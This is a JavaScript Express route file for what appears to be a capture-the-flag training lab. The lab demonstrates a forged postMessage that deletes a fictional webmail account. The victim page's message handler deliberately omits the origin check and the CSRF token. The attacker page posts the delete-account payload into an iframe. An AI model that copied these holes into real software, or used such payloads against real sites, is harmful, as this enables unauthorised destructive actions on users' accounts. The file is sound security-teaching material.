'use strict';
// Privileged Action via Forged Message: the account settings page listens for
// postMessage commands and deletes the lab account for ANY message shaped like
// {action:'delete-account'}, with no origin check and no user confirmation.
// The victim page's own script fires the beacon once the deletion lands, so the
// flag is only awarded for a real forged-message deletion in this session.
const express = require('express');
const { page, esc, payloadBlock } = require('../../../lib/page');

const router = express.Router();
router.use(express.urlencoded({ extended: false }));

// ---------------------------------------------------------------------------
// Lab 5 victim page: account settings for the fictional PenMail webmail app.
// ---------------------------------------------------------------------------
router.get('/csrf-action', (req, res) => {
  const deleted = req.session.pm_deleted === true;
  res.send(page('PenMail account settings', `
    <h2>PenMail account settings</h2>
    <div class="clay-card">
      <div class="card-top"><b>Your account</b>
        <span class="clay-pill"><span class="dot" style="background:${deleted ? '#d64545' : '#2fa36b'}"></span>${deleted ? 'DELETED' : 'Active'}</span>
      </div>
      <p class="dim">Signed in as <b>demo@penmail.lab</b>. Manage the settings for this mailbox below.</p>
    </div>
    <div class="clay-card">
      <div class="card-top"><b>Danger zone</b></div>
      <p class="dim">Deleting your account removes the mailbox and all its messages. This cannot be undone.</p>
      <form method="POST" action="/postmsg/csrf-action/delete">
        <button class="clay-btn clay-btn-primary" type="submit">Delete my account</button>
      </form>
      <p id="status" class="dim" role="status"></p>
    </div>
    <p class="dim">Lab attacker page: <a href="/postmsg/csrf-action/attacker">open it</a> and fire the payload.
    <a href="/postmsg/csrf-action/reset">Reset the lab account</a>.</p>
    <script>
      window.addEventListener('message', function (e) {
        var action = e.data && e.data.action;
        // VULN: a state-changing action is triggered by any cross-origin
        // message with no origin check and no user confirmation.
        if (action === 'delete-account') {
          fetch('/postmsg/csrf-action/delete', { method: 'POST' })
            .then(function (r) { return r.json(); })
            .then(function (j) {
              document.getElementById('status').textContent = j.status;
              fetch('/postmsg/beacon?v=csrf-action&d=' + encodeURIComponent('csrf-action:account-deleted'));
            });
        }
      });
    </script>
    <p><a href="/postmsg">Back to the postMessage module</a></p>
  `));
});

// ---------------------------------------------------------------------------
// State-changing endpoint. The victim's message handler calls it, and so does
// the legitimate delete button. No CSRF token on purpose: this is the lab.
// ---------------------------------------------------------------------------
router.post('/csrf-action/delete', (req, res) => {
  req.session.pm_deleted = true;
  res.json({ status: 'account deleted (lab only)' });
});

// ---------------------------------------------------------------------------
// Reset helper so the lab can be replayed.
// ---------------------------------------------------------------------------
router.get('/csrf-action/reset', (req, res) => {
  req.session.pm_deleted = false;
  res.redirect('/postmsg/csrf-action');
});

// ---------------------------------------------------------------------------
// Lab 5 attacker page: embeds the victim settings and sends it the forged
// delete-account message. No origin is checked by the victim.
// ---------------------------------------------------------------------------
router.get('/csrf-action/attacker', (req, res) => {
  res.send(page('Attacker: forged action', `
    <h2>Attacker page (lab 5)</h2>
    <div class="clay-card">
      <div class="card-top"><b>What this page does</b></div>
      <p class="dim">This page embeds the victim's PenMail account settings in the frame below
      and sends it a message the victim treats as a command. No origin is checked.</p>
    </div>
    <iframe id="v" src="/postmsg/csrf-action" width="100%" height="260" title="Victim account settings"></iframe>
    <p><button id="fire" class="clay-btn clay-btn-primary" type="button">Fire payload</button></p>
    <p id="log" class="dim" role="status"></p>
    ${payloadBlock('Payload', "document.getElementById('v').contentWindow.postMessage({ action: 'delete-account' }, '*');")}
    <div class="clay-card">
      <div class="card-top"><b>How to claim this flag</b></div>
      <ol>
        <li>Press <b>Fire payload</b> above. The forged <code>delete-account</code> message reaches the victim frame.</li>
        <li>The victim's own script deletes the lab account and calls the beacon, which awards the flag.</li>
        <li>The widget below polls the claim endpoint and flips when the server has captured the flag.</li>
      </ol>
      <p class="dim">A bare <code>curl</code> of the beacon gets a 400: the flag only lands when the victim page's
      script fires it after a real account deletion in your session.</p>
      <p id="claim-status-csrf-action" class="status status-missing" role="status" data-status-url="/postmsg/claim-status?v=csrf-action"><span class="dot" aria-hidden="true"></span><span class="claim-text">Checking claim status...</span></p>
    </div>
    <script>
      document.getElementById('fire').onclick = function () {
        document.getElementById('v').contentWindow.postMessage({ action: 'delete-account' }, '*');
        document.getElementById('log').textContent = 'Message sent. Reload the victim page to see the deleted account, and check your flag.';
      };
    </script>
    <p><a href="/postmsg">Back to the postMessage module</a></p>
  `));
});

module.exports = {
  vuln: {
    id: 'csrf-action',
    name: 'Privileged Action via Forged Message',
    difficulty: 'Medium',
    hint: 'The victim handler runs a state-changing action when it sees a matching message, and it never checks the origin. Inspect the handler in the victim page source to find which message property and value it reacts to.',
    hints: ["A forged postMessage can trigger actions in the victim. Which action?", "The delete action. Send the right message shape.", "postMessage the delete command. The server-side state changes."],
    tools: "B, DT",
    how: 'Post that message from the attacker page into the victim iframe.',
    link: '/postmsg#csrf-action',
    start: 'curl -s -b jar -c jar "http://localhost:3000/postmsg/csrf-action" | grep -i "account"\ncurl -s -b jar "http://localhost:3000/postmsg/csrf-action/reset" -o /dev/null -w "%{http_code}\\n"',
  },
  router,
};
